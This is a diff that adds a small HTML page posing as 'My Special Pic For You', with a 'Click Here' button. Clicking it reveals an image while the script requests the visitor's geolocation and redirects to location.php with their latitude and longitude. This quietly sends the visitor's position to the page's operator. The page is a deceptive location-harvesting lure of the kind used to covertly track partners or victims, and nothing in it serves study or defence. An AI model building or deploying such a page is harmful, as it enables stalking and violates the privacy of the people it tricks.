@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>My Pic For My love</title>
+</head>
+<body>
+    <h1>My Special Pic For You</h1>
+    
+    <!-- Share Location Button -->
+    <button onclick="getLocation()">Click Here</button>
+    
+    <!-- Hidden Image that will be shown after button click -->
+    <div id="image-container" style="display:none;">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS-YWH4Il-bbWyGSkSHIyqScbycf1RXKtKRvw&s" alt="Your Image Description" style="max-width:100%;height:auto;">
+    </div>
+
+    <script>
+        function getLocation() {
+            // Display the image
+            document.getElementById('image-container').style.display = 'block';
+
+            // Get the user's location
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation);
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function sendLocation(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            window.location.href = `location.php?latitude=${latitude}&longitude=${longitude}`;
+        }
+    </script>
+</body>
+</html>
